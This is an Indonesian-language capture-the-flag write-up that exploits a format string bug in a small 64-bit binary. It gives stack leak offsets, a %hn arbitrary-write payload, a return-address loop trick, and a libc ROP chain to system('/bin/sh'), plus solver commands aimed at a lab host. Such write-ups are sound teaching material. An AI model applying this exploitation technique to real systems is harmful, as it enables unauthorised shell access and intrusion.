# LLM Showdown - Writeup PWN

## Ringkasan

Binary ini kecil banget dan bug utamanya ada di fungsi `echo()`. Program membaca input ke buffer stack ukuran 0x20, tapi setelah itu buffer dipakai langsung sebagai format string:

```c
read(0, buf, 0x1f);
printf(buf);
```

Jadi ini bukan overflow klasik. `read()` hanya 31 byte, sedangkan buffer 32 byte, jadi RIP tidak ketimpa langsung. Jalan masuknya adalah format string vulnerability.

Proteksi yang kelihatan dari `readelf`/analisis lokal:

- ELF 64-bit PIE
- NX aktif (`GNU_STACK` tidak executable)
- Tidak ada stack canary (`__stack_chk_fail` tidak ada)
- RELRO partial, GOT masih writable
- Binary tidak stripped, simbol `main` dan `echo` masih ada

## Bug penting

Disassembly fungsi `echo()`:

```asm
sub    rsp,0x20
...
read(0, rbp-0x20, 0x1f)
printf(rbp-0x20)
leave
ret
```

Karena `printf()` dipanggil tanpa format tetap, input seperti `%10$p` bisa membaca stack, dan `%n/%hn/%hhn` bisa dipakai untuk menulis ke alamat yang kita taruh sendiri di buffer.

Layout argumen format string yang kepakai:

- argumen ke-6 mulai dari isi buffer offset 0
- argumen ke-9 membaca qword di buffer offset 24

Makanya payload write dibuat seperti ini:

```text
%1$<nilai>c%9$hn\x00 + padding sampai offset 24 + alamat target 7 byte
```

Byte ke-8 alamat tidak perlu dikirim karena buffer sudah di-zero-kan sebelum `read()`, dan alamat userland canonical byte tertingginya `0x00`.

## Leak

Payload leak:

```text
%10$p.%11$p.%13$p
```

Hasilnya:

- `%10$p` = stack anchor / saved RBP milik `main`
- `%11$p` = return address setelah echo pertama, yaitu `PIE + 0x121e`
- `%13$p` = return address `main` ke libc, yaitu `libc + 0x29ca8`

Dari sini didapat:

```text
pie_base  = leak_11 - 0x121e
libc_base = leak_13 - 0x29ca8
```

## Bikin loop stabil

Program hanya memanggil `echo()` dua kali. Supaya bisa punya banyak kesempatan write, return address echo kedua diarahkan balik ke bagian `main` sebelum path `Name:`:

```text
main + 0x1205
```

Return normal echo kedua adalah `PIE + 0x1237`. Karena masih satu page, cukup ubah low byte `0x37` menjadi `0x05` memakai `%hhn` ke slot return address echo:

```text
target = stack_anchor - 8
```

Loop ke `main+0x1205` ini enak karena stack anchor tetap stabil. Kalau balik ke awal `main`, stack akan turun 8 byte tiap putaran karena prologue `push rbp`, jadi ROP chain lebih gampang rusak.

## Arbitrary write

Primitive write yang dipakai adalah 2-byte write:

```python
%1$<value>c%9$hn
```

Target address diletakkan di offset 24 buffer, sehingga bisa diakses sebagai `%9$hn`.

Setiap satu putaran loop:

1. Echo pertama dipakai untuk write 2 byte ke alamat target.
2. Echo kedua dipakai untuk mengembalikan eksekusi lagi ke `main+0x1205`.

## ROP chain

ROP chain ditulis ke area saved return milik `main`, relatif dari stack anchor hasil leak:

```text
stack+0x08 = ret gadget          (PIE + 0x1016)
stack+0x10 = pop rdi; ret        (libc + 0x2a145)
stack+0x18 = pointer "/bin/sh"   (libc + 0x1a5ea4)
stack+0x20 = system              (libc + 0x53110)
```

Ret gadget pertama dipakai untuk alignment stack sebelum masuk `system()`. Tanpa gadget ini exploit lokal sempat crash karena alignment tidak pas.

Setelah semua chain tertulis, echo terakhir dibiarkan return normal. `main` selesai, lalu saved RIP milik `main` sudah mengarah ke ROP chain dan akhirnya memanggil:

```c
system("/bin/sh")
```

## Cara jalanin

Local:

```bash
python3 solve.py local
```

Remote:

```bash
source /home/nata/ctf_env/bin/activate
python3 solve.py remote --host 10.42.5.10 --port 1337
```

Default command di solver akan mencoba baca flag:

```bash
cat flag* 2>/dev/null; cat /flag* 2>/dev/null; exit
```

Kalau mau shell interaktif tanpa auto command:

```bash
python3 solve.py remote --no-cmd
```

## Catatan libc

Offset libc yang dipakai di solver berasal dari environment lokal yang dipakai waktu analisis:

```text
__libc_start_main return leak : 0x29ca8
pop rdi; ret                  : 0x2a145
/bin/sh                       : 0x1a5ea4
system                        : 0x53110
```
